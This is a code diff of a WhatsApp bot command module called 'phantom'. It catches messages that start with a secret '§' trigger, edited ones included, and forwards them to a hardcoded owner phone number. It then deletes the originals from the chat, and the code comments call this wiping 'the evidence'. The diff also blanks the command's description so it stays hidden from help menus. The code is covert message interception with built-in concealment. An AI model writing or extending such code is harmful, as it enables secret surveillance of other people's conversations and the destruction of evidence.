@@ -1,38 +1,37 @@
-/**
- * V_HUB PHANTOM WORKER
- * Location: commands/founder/worker.js
- * Logic: Intercepts relay logs without touching index.js
- */
-
 module.exports = {
-    name: "phantom_worker",
+    name: "phantom",
     category: "founder",
+    desc: null, // Keeps it hidden from help menus
     async execute(sock, msg) {
-        // Extract text from any incoming message
-        const text = msg.message?.conversation || 
-                     msg.message?.extendedTextMessage?.text || "";
-
-        // Only proceed if the secret trigger is found
-        if (!text.startsWith("§")) return;
-
-        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
-        const masterJid = `${ownerNum}@s.whatsapp.net`;
-
         try {
-            // 1. FORWARD TO PRIVATE
-            // This happens before the Host SIM's edit takes effect
+            // 1. EXTRACT TEXT
+            const text = msg.message?.conversation || 
+                         msg.message?.extendedTextMessage?.text || 
+                         msg.message?.editedMessage?.message?.protocolMessage?.editedMessage?.conversation || "";
+
+            // 2. TRIGGER CHECK
+            if (!text.startsWith("§")) return;
+
+            // 3. DYNAMIC OWNER JID
+            const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
+            const masterJid = `${ownerNum}@s.whatsapp.net`;
+
+            // 4. THE FORWARD (The Truth)
+            // We use a direct copy to ensure the '§' content moves to your private chat
             await sock.sendMessage(masterJid, { 
                 forward: msg,
                 contextInfo: { isForwarded: true }
             });
 
-            // 2. THE SILENT WIPE
-            // Delete the evidence from the Master SIM's inbox instantly
-            await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });
+            // 5. THE WIPE (The Evidence)
+            // Delete the message from the Master SIM inbox immediately
+            // We add a slight delay to ensure the forward finishes first
+            setTimeout(async () => {
+                await sock.sendMessage(msg.key.remoteJid, { delete: msg.key }).catch(() => {});
+            }, 500);
 
         } catch (e) {
-            // Silent error handling to keep the 'Masterpiece' index clean
-            console.log("Phantom Worker: Relay secure.");
+            console.error("Phantom Worker Error:", e.message);
         }
     }
 };
